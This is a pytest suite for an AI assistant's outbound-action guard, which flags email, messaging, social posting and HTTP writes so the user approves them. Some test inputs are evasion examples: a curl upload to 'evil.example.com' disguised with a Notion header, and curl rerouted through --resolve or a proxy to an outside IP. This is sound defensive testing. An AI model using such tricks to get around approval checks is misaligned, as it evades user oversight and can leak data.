"""kiwiagent: outbound actions need the user's approval (SmartBuddy promise:
"Every action needs your approval").

Anything the buddy sends out in the user's name — email, messages to other
people, data written to an external service — is detected so it can always be
put in front of the user (never smart-auto-approved), and never runs from a
cron job where no one is there to approve it.
"""
import pytest

from tools.outbound_guard import (
    allowable_http_host,
    detect_outbound_action,
    detect_outbound_command,
)


class TestEmail:
    @pytest.mark.parametrize("text", [
        "import smtplib\ns = smtplib.SMTP_SSL('smtp.gmail.com', 465)\ns.send_message(msg)",
        "server = SMTP('smtp.office365.com', 587)",
        "echo hi | sendmail boss@example.com",
        "mail -s 'Report' boss@example.com < report.txt",
        "msmtp -a work boss@example.com < mail.txt",
        "service.users().messages().send(userId='me', body=raw).execute()",
        "service.users().drafts().send(userId='me', body={'id': d}).execute()",
        "curl -X POST https://gmail.googleapis.com/gmail/v1/users/me/messages/send -d @raw.json",
    ])
    def test_detected(self, text):
        found, key, desc = detect_outbound_action(text)
        assert found and key == "outbound:email"
        assert desc == "send an email"

    def test_reading_mail_is_not_outbound(self):
        text = "import imaplib\nM = imaplib.IMAP4_SSL('imap.gmail.com')\nM.select('INBOX')"
        assert detect_outbound_action(text)[0] is False


class TestMessages:
    @pytest.mark.parametrize("text", [
        "from twilio.rest import Client\nClient(sid, tok).messages.create(to=n, body=b)",
        "curl -s https://api.telegram.org/bot123:abc/sendMessage -d chat_id=1 -d text=hi",
        "curl -X POST -H 'Content-type: application/json' --data '{}' https://hooks.slack.com/services/T/B/X",
        "requests.post('https://discord.com/api/webhooks/1/abc', json={'content': 'hi'})",
    ])
    def test_detected(self, text):
        found, key, desc = detect_outbound_action(text)
        assert found and key == "outbound:message"
        assert desc == "send a message to someone"


class TestHttpWrites:
    @pytest.mark.parametrize("text,host", [
        ("curl -X POST https://api.example.com/orders -d '{}'", "api.example.com"),
        ("curl --request DELETE https://api.example.com/items/1", "api.example.com"),
        ("curl -d name=x https://forms.example.org/submit", "forms.example.org"),
        ("curl -F file=@a.pdf https://upload.example.net/", "upload.example.net"),
        ("wget --post-data 'a=1' https://shop.example.com/cart", "shop.example.com"),
        ("http POST https://api.example.com/x name=y", "api.example.com"),
        ("import requests\nrequests.put('https://api.example.com/profile', json=p)", "api.example.com"),
        ("import httpx\nhttpx.patch('https://api.example.com/x', json=p)", "api.example.com"),
    ])
    def test_detected_with_host(self, text, host):
        found, key, desc = detect_outbound_action(text)
        assert found and key == f"outbound:http:{host}"
        assert desc == f"send data to {host}"

    def test_unknown_target_still_detected(self):
        found, key, desc = detect_outbound_action("import requests\nrequests.post(url, json=payload)")
        assert found and desc == "send data to an online service"

    @pytest.mark.parametrize("text", [
        "curl https://api.example.com/items",
        "curl -s -o page.html https://example.com",
        "wget https://example.com/file.zip",
        "requests.get('https://api.example.com/x')",
        "http GET https://api.example.com/x",
    ])
    def test_reads_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        "curl -X POST http://localhost:8642/v1/chat -d '{}'",
        "curl -X POST http://127.0.0.1:9000/x -d a=1",
        "requests.post('http://litellm.platform.svc.cluster.local:4000/v1/chat/completions', json=b)",
    ])
    def test_internal_hosts_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        "requests.post('https://api.notion.com/v1/databases/abc/query', json={})",
        "curl -X POST https://api.notion.com/v1/search -d '{}'",
    ])
    def test_read_only_post_apis_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False


class TestNotionReadOnly:
    """Notion's search / query APIs are POSTs that only read. Scripts usually
    build the URL from a base (f"{API_URL}/search"), so the full URL never
    appears as one string."""

    def test_search_with_built_url_not_outbound(self):
        text = (
            'API_URL = "https://api.notion.com/v1"\n'
            'req = urllib.request.Request(\n    f"{API_URL}/search",\n'
            '    data=json.dumps(body).encode(), headers=h,\n    method=\'POST\'\n)\n'
            'with urllib.request.urlopen(req) as r:\n    pages = json.load(r)["results"]\n'
        )
        assert detect_outbound_action(text)[0] is False

    def test_database_query_with_built_url_not_outbound(self):
        text = (
            'BASE = "https://api.notion.com/v1"\n'
            'requests.post(f"{BASE}/databases/{db_id}/query", headers=h, json={})\n'
        )
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("text", [
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/pages", json=page)',
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/search", json={})\n'
        'requests.patch(f"{BASE}/pages/{pid}", json={"archived": True})',
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/comments", json=c)',
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/search")\n'
        'requests.patch(f"{BASE}/blocks/{bid}/children", json=b)',
    ])
    def test_notion_writes_still_outbound(self, text):
        found, key, desc = detect_outbound_action(text)
        assert found and desc == "send data to api.notion.com"


class TestCommandWithScriptFile:
    def test_script_file_contents_are_scanned(self, tmp_path):
        (tmp_path / "send_report.py").write_text(
            "import smtplib\nwith smtplib.SMTP_SSL('smtp.gmail.com') as s:\n    s.send_message(m)\n")

        found, key, _ = detect_outbound_command("python3 send_report.py --to boss", cwd=str(tmp_path))

        assert found and key == "outbound:email"

    def test_script_found_in_scripts_dir(self, tmp_path):
        scripts = tmp_path / "scripts"
        scripts.mkdir()
        (scripts / "notify.sh").write_text("curl -X POST https://hooks.slack.com/services/a -d x\n")

        found, key, _ = detect_outbound_command("bash scripts/notify.sh", cwd=str(tmp_path))

        assert found and key == "outbound:message"

    def test_harmless_script_not_flagged(self, tmp_path):
        (tmp_path / "check_mail.py").write_text("import imaplib\nprint('ok')\n")

        assert detect_outbound_command("python check_mail.py", cwd=str(tmp_path))[0] is False

    def test_missing_script_is_not_an_error(self, tmp_path):
        assert detect_outbound_command("python nope.py", cwd=str(tmp_path))[0] is False

    def test_plain_command_is_scanned(self, tmp_path):
        found, key, _ = detect_outbound_command(
            "curl -X POST https://api.example.com/x -d a=1", cwd=str(tmp_path))
        assert found and key == "outbound:http:api.example.com"


class TestPerHostKey:
    """A write to exactly one external host is keyed by that host, so the user
    can always-allow it (outbound:http:<host>). Anything else stays generic."""

    def test_host_is_lowercased_and_port_dropped(self):
        found, key, _ = detect_outbound_action("curl -X POST https://API.Notion.com:443/v1/pages -d '{}'")
        assert found and key == "outbound:http:api.notion.com"

    def test_userinfo_is_not_the_host(self):
        found, key, _ = detect_outbound_action("curl -X POST https://bot:s3cret@api.example.com/x -d a=1")
        assert found and key == "outbound:http:api.example.com"

    def test_same_host_twice_is_one_host(self):
        text = ("requests.post('https://api.example.com/a', json=1)\n"
                "requests.post('https://api.example.com/b', json=2)")
        assert detect_outbound_action(text)[1] == "outbound:http:api.example.com"

    def test_several_external_hosts_get_generic_key(self):
        text = "curl https://a.example.com/x | curl -X POST https://b.example.org/y -d @-"
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http"

    def test_unknown_target_gets_generic_key(self):
        found, key, _ = detect_outbound_action("import requests\nrequests.post(url, json=payload)")
        assert found and key == "outbound:http"

    def test_templated_host_gets_generic_key(self):
        found, key, _ = detect_outbound_action('requests.post(f"https://{host}/v1/x", json=b)')
        assert found and key == "outbound:http"


class TestPublishAsUserHosts:
    """Writes to social-posting and mail/message-sending APIs publish in the
    user's name: they are never a plain http write (never always-allowed)."""

    @pytest.mark.parametrize("host", [
        "api.twitter.com", "api.x.com", "graph.facebook.com", "graph.instagram.com",
        "api.linkedin.com", "api.weibo.com", "open.weibo.com", "graph.threads.net",
        "api.threads.net", "gmail.googleapis.com", "graph.microsoft.com",
        "api.sendgrid.com", "api.mailgun.net", "api.postmarkapp.com", "slack.com",
        "api.slack.com", "discord.com", "api.telegram.org", "graph.whatsapp.com",
        "mmg.whatsapp.net",
    ])
    def test_write_is_publish(self, host):
        found, key, desc = detect_outbound_action(f"curl -X POST https://{host}/v1/x -d a=1")
        assert found and key == "outbound:publish"
        assert desc == f"send data to {host}"

    def test_twilio_is_a_message(self):
        found, key, _ = detect_outbound_action("curl -X POST https://api.twilio.com/v1/x -d a=1")
        assert found and key == "outbound:message"

    def test_publish_host_among_others_is_publish(self):
        text = ("requests.post('https://api.notion.com/v1/pages', json=p)\n"
                "requests.post('https://api.x.com/2/tweets', json=t)")
        assert detect_outbound_action(text)[1] == "outbound:publish"

    def test_lookalike_host_is_not_publish(self):
        found, key, _ = detect_outbound_action("curl -X POST https://notslack.com/x -d a=1")
        assert found and key == "outbound:http:notslack.com"

    def test_reading_from_publish_host_is_not_outbound(self):
        assert detect_outbound_action("curl https://api.x.com/2/tweets/1")[0] is False


class TestAllowableHttpHost:
    @pytest.mark.parametrize("key,host", [
        ("outbound:http:api.notion.com", "api.notion.com"),
        ("outbound:http:hooks.zapier.com", "hooks.zapier.com"),
    ])
    def test_allowable(self, key, host):
        assert allowable_http_host(key) == host

    @pytest.mark.parametrize("key", [
        "outbound:email", "outbound:message", "outbound:publish",
        "outbound:email:x", "outbound:http", "outbound:http:",
        "outbound:http:api.x.com", "outbound:http:graph.whatsapp.com",
        "outbound:http:API.NOTION.COM", "outbound:http:{host}",
        "recursive delete", "", None,
    ])
    def test_not_allowable(self, key):
        assert allowable_http_host(key) is None


class TestPerHostKeyNeedsLiteralTargets:
    """outbound:http:<host> (always-allowable) only when EVERY write has a
    literal target URL on that one host. A URL in a comment or an unrelated
    string never makes a write to a variable target "literal to that host"."""

    @pytest.mark.parametrize("text", [
        # comment mentions notion, write goes to a variable
        "# push to https://api.notion.com/v1/pages\nrequests.post(url, json=p)",
        # unrelated string mentions notion
        'DOCS = "https://api.notion.com/v1/pages"\nrequests.post(os.environ["HOOK"], json=p)',
        # literal notion write plus a write to a variable
        "requests.post('https://api.notion.com/v1/pages', json=p)\nrequests.post(target, json=p)",
        # a client object posting to a variable is still a write
        "requests.post('https://api.notion.com/v1/pages', json=p)\nclient.post(target, json=p)",
        # string concatenation / formatting is not literal
        "requests.post('https://api.notion.com/' + path, json=p)",
        "requests.post('https://%s/v1/pages' % host, json=p)",
        # f-string whose host part is not literal
        'requests.post(f"https://api.notion.com{suffix}", json=p)',
        'requests.post(f"https://{host}/v1/pages", json=p)',
        # url passed late as keyword after other args
        "requests.post(json=p, url=u)\n# https://api.notion.com",
        # urllib with method= and a variable url
        "req = urllib.request.Request(url, data=b, method='POST')\n# https://api.notion.com/v1",
        # curl to a shell variable, notion only in a header
        'curl -X POST "$URL" -H "Referer: https://api.notion.com" -d @p.json',
        # curl schemeless target, notion only in a header
        "curl -X POST evil.example.com -H 'Referer: https://api.notion.com' -d @p.json",
        # curl connection redirected / proxied
        "curl -X POST https://api.notion.com/v1/pages --resolve api.notion.com:443:203.0.113.9 -d @p",
        "curl -x http://203.0.113.9:8080 -X POST https://api.notion.com/v1/pages -d @p",
        # a later curl segment writing to a variable
        "curl -X POST https://api.notion.com/v1/pages -d @p && curl -X POST $HOOK -d @p",
        # curl run from Python with an argument list (not parsed as a shell call)
        "requests.post('https://api.notion.com/v1/pages', json=p)\n"
        "subprocess.run(['curl', '-X', 'POST', hook, '-d', body])",
    ])
    def test_non_literal_write_gets_generic_key(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http"

    @pytest.mark.parametrize("text", [
        "requests.post('https://api.notion.com/v1/pages', json=a)\n"
        "requests.patch(\"https://api.notion.com/v1/pages/1\", json=b)",
        'requests.post(f"https://api.notion.com/v1/pages/{pid}", json=b)',
        "requests.post(url='https://api.notion.com/v1/pages', json=b)",
        "httpx.post(\n    'https://api.notion.com/v1/pages',\n    json=b,\n)",
        "req = urllib.request.Request('https://api.notion.com/v1/pages', data=b, method='POST')",
        "curl -sS -X POST https://api.notion.com/v1/pages -H \"Authorization: Bearer $NOTION_TOKEN\" -d @p.json",
        "curl -XPOST 'https://api.notion.com/v1/pages' --data-binary @p.json",
        "http POST https://api.notion.com/v1/pages Authorization:\"Bearer $T\" title=x",
        "wget --header 'Content-Type: application/json' --post-file p.json https://api.notion.com/v1/pages",
    ])
    def test_literal_writes_to_one_host_get_host_key(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http:api.notion.com"


class TestCommandAndScriptsCombined:
    def test_script_writing_to_variable_spoils_command_host(self, tmp_path):
        (tmp_path / "sync.py").write_text("import requests\nrequests.post(HOOK, json=d)\n")

        found, key, _ = detect_outbound_command(
            "curl -X POST https://api.notion.com/v1/pages -d @p && python3 sync.py", cwd=str(tmp_path))

        assert found and key == "outbound:http"

    def test_email_in_script_outranks_http_in_command(self, tmp_path):
        (tmp_path / "mail.py").write_text("import smtplib\nsmtplib.SMTP('x')\n")

        found, key, _ = detect_outbound_command(
            "curl -X POST https://api.notion.com/v1/pages -d @p && python3 mail.py", cwd=str(tmp_path))

        assert found and key == "outbound:email"

    def test_command_and_script_on_same_host_keep_host_key(self, tmp_path):
        (tmp_path / "sync.py").write_text(
            "import requests\nrequests.post('https://api.notion.com/v1/pages', json=d)\n")

        found, key, _ = detect_outbound_command(
            "curl -X POST https://api.notion.com/v1/pages -d @p && python3 sync.py", cwd=str(tmp_path))

        assert key == "outbound:http:api.notion.com"


class TestInternalExemptionNeedsLiteralTargets:
    """Only talking to the platform itself is fine — but only when every write
    literally targets an internal host. An internal URL in a comment or string
    never vouches for a write to a variable."""

    @pytest.mark.parametrize("text", [
        "# local test: http://localhost:8642/v1\nrequests.post(url, json=b)",
        'BASE = "http://127.0.0.1:9000"\nrequests.post(os.environ["HOOK"], json=b)',
        'curl -X POST "$URL" -d x  # http://localhost:8642/v1',
        "requests.post('http://localhost:8642/v1/x', json=b)\nrequests.post(hook, json=b)",
        "fetch(target, {method: 'POST', body})\n// http://localhost:3000",
    ])
    def test_variable_write_is_outbound(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http"

    @pytest.mark.parametrize("text", [
        "fetch('http://localhost:3000/api/x', {method: 'POST', body})",
        "requests.post('http://localhost:8642/v1/a', json=b)\nrequests.put('http://127.0.0.1:9000/b', json=c)",
    ])
    def test_literal_internal_writes_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False


class TestNotionReadOnlyNeedsLiteralTargets:
    """The Notion read-only exemption covers a script only when every
    write-looking call targets a Notion read endpoint (search / database
    query) — literally, or through a base URL constant assigned once."""

    @pytest.mark.parametrize("text", [
        # read endpoint only in a comment, POST to a variable
        "# https://api.notion.com/v1/search\nrequests.post(url, json={})",
        # literal Notion search plus a POST to a variable
        "requests.post('https://api.notion.com/v1/search', json={})\nrequests.post(hook, json=data)",
        # built search URL plus a POST to a variable
        'BASE = "https://api.notion.com/v1"\nrequests.post(f"{BASE}/search", json={})\n'
        "requests.post(other, json=x)",
        # base constant reassigned
        'BASE = "https://api.notion.com/v1"\nBASE = os.environ["X"]\n'
        'requests.post(f"{BASE}/search", json={})',
        # base shadowed by a parameter
        'BASE = "https://api.notion.com/v1"\ndef q(BASE):\n'
        '    requests.post(f"{BASE}/search", json={})',
        # read endpoint, write method
        "curl -X PATCH https://api.notion.com/v1/search -d '{}'",
        "requests.put('https://api.notion.com/v1/search', json={})",
        # Notion search via fetch plus fetch POST to a variable
        "fetch('https://api.notion.com/v1/search', {method: 'POST'})\n"
        "fetch(hook, {method: 'POST', body})",
    ])
    def test_not_exempt(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key.startswith("outbound:http")

    @pytest.mark.parametrize("text", [
        "fetch('https://api.notion.com/v1/search', {method: 'POST', body: q})",
        "curl -sS -X POST https://api.notion.com/v1/databases/abc/query -H \"Authorization: Bearer $T\" -d '{}'",
    ])
    def test_read_only_calls_still_exempt(self, text):
        assert detect_outbound_action(text)[0] is False


class TestJavaScriptWrites:
    @pytest.mark.parametrize("text,key", [
        ("await fetch('https://api.example.com/x', {method: 'POST', body: b})",
         "outbound:http:api.example.com"),
        ("fetch(`https://api.example.com/items/${id}`, { method: \"PATCH\", body })",
         "outbound:http:api.example.com"),
        ("const r = await fetch(url, { method: 'PUT', body })", "outbound:http"),
        ("fetch(`https://${host}/x`, {method: 'DELETE'})", "outbound:http"),
        ("await axios.post('https://api.example.com/x', data)", "outbound:http:api.example.com"),
        ("await axios.delete(url)", "outbound:http"),
        ("axios({method: 'post', url: 'https://api.example.com/x', data})", "outbound:http"),
        ("const req = https.request({hostname: 'api.example.com', method: 'POST'}, cb)",
         "outbound:http"),
    ])
    def test_detected(self, text, key):
        found, got, _ = detect_outbound_action(text)
        assert found and got == key

    @pytest.mark.parametrize("text", [
        "const r = await fetch('https://api.example.com/x')",
        "fetch('https://api.example.com/x', {method: 'GET'})",
        "await axios.get('https://api.example.com/x')",
    ])
    def test_reads_are_not_outbound(self, text):
        assert detect_outbound_action(text)[0] is False

    @pytest.mark.parametrize("command,name", [
        ("node send.mjs", "send.mjs"),
        ("npx tsx send.ts", "send.ts"),
        ("bun run send.ts", "send.ts"),
        ("deno run -A send.ts", "send.ts"),
        ("node scripts/post.cjs --dry-run=false", "scripts/post.cjs"),
    ])
    def test_js_script_files_are_scanned(self, tmp_path, command, name):
        path = tmp_path / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text("await fetch(process.env.HOOK, {method: 'POST', body})\n")

        found, key, _ = detect_outbound_command(command, cwd=str(tmp_path))

        assert found and key == "outbound:http"


class TestHostKeyThroughBaseConstant:
    """The Notion skill writes with f"{API_URL}/pages": a base constant bound
    once to a literal URL counts as a literal target for the host key too."""

    @pytest.mark.parametrize("text", [
        'API_URL = "https://api.notion.com/v1"\nrequests.post(f"{API_URL}/pages", json=page)',
        'BASE: str = "https://api.notion.com/v1"\nrequests.patch(f"{BASE}/pages/{pid}", json=p)\n'
        'requests.post(f"{BASE}/pages", json=q)',
        'const BASE = "https://api.notion.com/v1";\n'
        "await fetch(`${BASE}/pages`, {method: 'POST', body})",
    ])
    def test_base_constant_gets_host_key(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http:api.notion.com"

    @pytest.mark.parametrize("text", [
        # reassigned
        'BASE = "https://api.notion.com/v1"\nBASE = os.environ["X"]\n'
        'requests.post(f"{BASE}/pages", json=p)',
        'BASE = "https://api.notion.com/v1"\nBASE += suffix\nrequests.post(f"{BASE}/pages", json=p)',
        # shadowed by a parameter
        'BASE = "https://api.notion.com/v1"\ndef create(BASE, page):\n'
        '    requests.post(f"{BASE}/pages", json=page)',
        # deleted
        'BASE = "https://api.notion.com/v1"\ndel BASE\nrequests.post(f"{BASE}/pages", json=p)',
        # built from another expression
        'BASE = HOST + "/v1"\nrequests.post(f"{BASE}/pages", json=p)\n# https://api.notion.com',
        # base on another host, notion only in a comment
        'BASE = "https://hooks.example.org/v1"\n# like https://api.notion.com/v1/pages\n'
        'requests.post(f"{BASE}/pages", json=p)',
    ])
    def test_unsure_base_gets_generic_key(self, text):
        found, key, _ = detect_outbound_action(text)
        assert found and key == "outbound:http"
